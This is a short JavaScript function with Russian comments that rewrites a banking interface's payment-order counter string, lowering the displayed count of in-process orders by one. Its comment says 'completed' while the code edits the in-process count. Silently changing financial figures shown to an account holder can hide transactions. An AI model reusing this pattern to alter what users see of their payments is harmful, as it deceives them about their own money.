/*Панель навигации, Платежные поручения -> Завершонные*/
function fixCounters(a)
{
	//&IMPORTED_PAYDOCRU=00&NEW_PAYDOCRU=00&SIGNED_PAYDOCRU=00&INPROCESS_PAYDOCRU=00&REJECTED0GTHEN0_PAYDOCRU=18&COMPLETED_PAYDOCRU=0457
	
	var data = a.split("&");
	$.each(data, function(key,val){
		if(val.match(/INPROCESS_PAYDOCRU/))
		{
			val = val.split("=");
			var color = val[1].substr(0,1);
			
			/*Уменьшим кол-во завершенных на 1*/
			var count = parseInt(val[1].substr(1,val[1].length));

			if(count > 0)
				count -= 1;
				
			val[1] = color.toString()+count.toString();
			data[key] = val.join("=");
		}
	});
	data = data.join("&");
	return data;
}